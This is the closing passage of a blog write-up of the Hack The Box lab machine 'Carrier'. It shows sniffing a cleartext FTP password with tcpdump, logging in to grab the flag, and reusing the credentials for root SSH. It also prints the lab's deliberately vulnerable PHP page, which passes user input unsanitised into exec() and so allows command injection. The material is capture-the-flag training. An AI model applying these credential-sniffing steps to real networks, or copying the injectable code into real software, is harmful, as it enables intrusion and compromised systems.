+13:58:01.309398 00:16:3e:8a:f2:4f &gt; 00:16:3e:5b:49:a9, ethertype IPv4 (0x0800), length 66: 10.120.15.10.21 &gt; 10.78.10.2.39156: Flags [.], ack 12, win 227, opt
+ions [nop,nop,TS val 144101546 ecr 1352793867], length 0
+13:58:01.309584 00:16:3e:8a:f2:4f &gt; 00:16:3e:5b:49:a9, ethertype IPv4 (0x0800), length 100: 10.120.15.10.21 &gt; 10.78.10.2.39156: Flags [P.], seq 21:55, ack 12, win 227, options [nop,nop,TS val 144101546 ecr 1352793867], length 34: FTP: 331 Please specify the password.
+13:58:01.309626 00:16:3e:5b:49:a9 &gt; 00:16:3e:8a:f2:4f, ethertype IPv4 (0x0800), length 88: 10.78.10.2.39156 &gt; 10.120.15.10.21: Flags [P.], seq 12:34, ack 55,
+win 229, options [nop,nop,TS val 1352793867 ecr 144101546], length 22: FTP: PASS BGPtelc0rout1ng
+13:58:01.356261 00:16:3e:8a:f2:4f &gt; 00:16:3e:5b:49:a9, ethertype IPv4 (0x0800), length 66: 10.120.15.10.21 &gt; 10.78.10.2.39156: Flags [.], ack 34, win 227, options [nop,nop,TS val 144101593 ecr 1352793867], length 0
+13:58:01.465910 00:16:3e:8a:f2:4f &gt; 00:16:3e:5b:49:a9, ethertype IPv4 (0x0800), length 89: 10.120.15.10.21 &gt; 10.78.10.2.39156: Flags [P.], seq 55:78, ack 34,
+win 227, options [nop,nop,TS val 144101703 ecr 1352793867], length 23: FTP: 230 Login successful.
+</code></pre>
+
+<p>Look closely and you see the two messages &ldquo;FTP: USER root&rdquo; and &ldquo;FTP: PASS BGPtelc0rout1ng&rdquo;
+sent from client &ldquo;10.78.10.2&rdquo; to FTP server &ldquo;10.120.15.10&rdquo;. If you like it in
+Wireshark, add <code>-w capture.pack</code> to the tcpdump invocation, get the file onto
+your machine and open in <a href="https://www.wireshark.org/">Wireshark</a>.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/19_htb_carrier/htb_carrier_wireshark.jpg"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Captured FTP session</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+
+<h2 id="ftp-login">FTP login</h2>
+
+<p>With the password and IP of the FTP server we can connect, enter passive mode and
+list files:</p>
+
+<pre><code>root@r1:/dev/shm/.me# ftp 10.120.15.10
+Connected to 10.120.15.10.
+220 (vsFTPd 3.0.3)
+Name (10.120.15.10:root): root
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; pass
+Passive mode on.
+ftp&gt; dir
+227 Entering Passive Mode (10,120,15,10,127,147).
+150 Here comes the directory listing.
+-r--------    1 0        0              33 Jul 01  2018 root.txt
+-rw-------    1 0        0              33 Mar 09 21:22 secretdata.txt
+226 Directory send OK.
+</code></pre>
+
+<p>There are two of them. The flag and a mysterious other file. Just
+download both:</p>
+
+<pre><code>ftp&gt; get root.txt
+local: root.txt remote: root.txt
+227 Entering Passive Mode (10,120,15,10,247,238).
+150 Opening BINARY mode data connection for root.txt (33 bytes).
+226 Transfer complete.
+33 bytes received in 0.00 secs (12.4044 kB/s)
+ftp&gt; get secretdata.txt
+local: secretdata.txt remote: secretdata.txt
+227 Entering Passive Mode (10,120,15,10,170,133).
+150 Opening BINARY mode data connection for secretdata.txt (33 bytes).
+226 Transfer complete.
+33 bytes received in 0.00 secs (93.1404 kB/s)
+ftp&gt; quit
+221 Goodbye
+</code></pre>
+
+<p>The flag is in root.txt and we are done. &ldquo;secretdata.txt&rdquo; contains another MD5
+hash. Many HTB users found this mysterious file (<a href="https://forum.hackthebox.eu/search?Search=secretdata">forum</a>).
+You must explore a little more how the box was made to see what it is.
+Check out the bonus section of you like.</p>
+
+<h1 id="bonus">Bonus</h1>
+
+<h2 id="ssh-to-ftp-server">SSH to FTP server</h2>
+
+<p>The credentials for the FTP server looked a lot like the root credentials
+for this server. There was also an SSH server running, so try logging in:</p>
+
+<pre><code>root@r1:/dev/shm/.me# ssh root@10.120.15.10
+root@10.120.15.10's password:
+Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-24-generic x86_64)
+...
+Last login: Sat Mar  9 21:42:33 2019 from 10.120.15.1
+root@carrier:~# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+
+<p>We are indeed root on a host called carrier. This one seems to be the real box
+as LXC is installed and multiple containers &ldquo;r1&rdquo;, &ldquo;r2&rdquo; and &ldquo;r3&rdquo; are
+running.</p>
+
+<p>Inspecting the containers a bit more, we find that &ldquo;r2&rdquo; regularly performs the
+upload via a cron job. &ldquo;secretdata.txt&rdquo; is just the file it uploads:</p>
+
+<pre><code>root@carrier:~# cat /var/lib/lxd/storage-pools/default/containers/r2/rootfs/var/spool/cron/crontabs/root
+...
+*/1 * * * * ftp -n -p 10.120.15.10 &lt; /root/ftpcommands.txt
+root@carrier:~# cat /var/lib/lxd/storage-pools/default/containers/r2/rootfs/root/ftpcommands.txt
+open 10.120.15.10
+user root BGPtelc0rout1ng
+put secretdata.txt
+quit
+root@carrier:~# cat
+/var/lib/lxd/storage-pools/default/containers/r2/rootfs/root/secretdata.txt
+56484a766247786c5a43456849513d3d
+</code></pre>
+
+<p>Another interesting thing to look at is the &ldquo;web&rdquo; container hosting the
+vulnerable diagnostics page. Printing it out shows how the insecure handling of
+user input allows command injection to a remote host it connects to via SSH.
+This is how we got from the website to the router.</p>
+
+<pre><code>root@carrier:/var/lib/lxd/storage-pools/default/containers/web/rootfs/var/www/html# cat diag.php
+...
+&lt;?php
+$check = base64_decode($_POST[&quot;check&quot;]);
+if ($check) {
+    exec(&quot;ssh -i /var/www/.ssh/id_rsa root@10.99.64.2 'ps waux | grep &quot; . $check . &quot; | grep -v grep'&quot;, $output);
+    foreach($output as $line) {
+        echo &quot;&lt;p&gt;&quot; . $line . &quot;&lt;/p&gt;&quot;;
+    }
+}
+?&gt;
+</code></pre>
+
+<h1 id="references">References</h1>
+
+<ul>
+<li>As for other write-ups, here is the <a href="https://www.youtube.com/watch?v=2ZxRA8BgmnA">ippsec video</a>
+and a <a href="https://0xdf.gitlab.io/2019/03/16/htb-carrier.html">0xdf</a> write-up with
+amazing explanations. Other write-ups are <a href="https://github.com/Hackplayers/hackthebox-writeups">here</a>
+(root flag needed) and they usually have a different approach. Instead of
+using tcpdump to listen to the traffic, they turn the router itself into an
+FTP server and just grab credentials that way. Also doable :)</li>
+<li>The Quagga <a href="https://www.quagga.net/docs.html">docs</a> themselves are not
+terribly helpful to get started unless you know a lot about networking
+already. For me, <a href="http://www.admin-magazine.com/Articles/Routing-with-Quagga">these</a>
+<a href="https://www.brianlinkletter.com/how-to-build-a-network-of-linux-routers-using-quagga/">links</a>
+<a href="https://wiki.gentoo.org/wiki/Quagga">here</a> helped me to gain some general
+understanding.</li>
+<li>A BGP hijacking lab task is <a href="http://cs.slu.edu/~espositof/teaching/4650/lab3/">here</a>.
+You cannot access or recreate the lab environment but the task description
+helps a lot.</li>
+<li>The article <a href="http://web.mit.edu/~alephtwo/www/552-F18/papers/caesar-rexford.pdf">BGP Routing Policies in ISP Networks</a>
+does a great job of explaining the various motives ISPs may have to deviate
+from shortest path routing and how policies are designed.</li>
+</ul>
+
+    </div>
+    
+    <footer>
+      <hr>
+      <p>
+  Published
+  
+    
+      by <span itemprop="author">Dominic Breuker</span>
+    
+  
+  <time itemprop="datePublished" datetime="2019-03-18T00:00:00&#43;01:00">
+    18 Mar, 2019
+  </time>
+  
+    in <span itemprop="articleSection"><a href="/categories/hackthebox/">hackthebox</a></span>
+  
+  
+    and tagged <a href="/tags/bgp-hijacking/">BGP hijacking</a>, <a href="/tags/ctf/">ctf</a>, <a href="/tags/hackthebox/">hackthebox</a>, <a href="/tags/infosec/">infosec</a> and <a href="/tags/write-up/">write-up</a>
+  
+  using <span itemprop="wordCount">5138</span> words.
+</p>
+
+      
+
+
+  <aside>
+    <header>Related Content</header>
+    <ul>
+      
+        <li><a href="/post/htb_access/">Hack The Box Write-up - Access</a>
+        <time datetime="11M">11 minutes</time>
+      
+        <li><a href="/post/htb_active/">Hack The Box Write-up - Active</a>
+        <time datetime="12M">12 minutes</time>
+      
+        <li><a href="/post/htb_dropzone/">Hack The Box Write-up - Dropzone</a>
+        <time datetime="10M">10 minutes</time>
+      
+        <li><a href="/post/htb_devoops/">Hack The Box Write-up - DevOops</a>
+        <time datetime="7M">7 minutes</time>
+      
+        <li><a href="/post/htb_sunday/">Hack The Box Write-up - Sunday</a>
+        <time datetime="8M">8 minutes</time>
+      
+        <li><a href="/post/htb_solidstate/">Hack The Box Write-up - SolidState</a>
+        <time datetime="12M">12 minutes</time>
+      
+        <li><a href="/post/htb_calamity/">Hack The Box Write-up - Calamity</a>
+        <time datetime="10M">10 minutes</time>
+      
+    </ul>
+  </aside>
+
+
+    </footer>
+  </article>
+</main>
+    <footer>
+  
+
+</footer>
+  </body>
+</html>
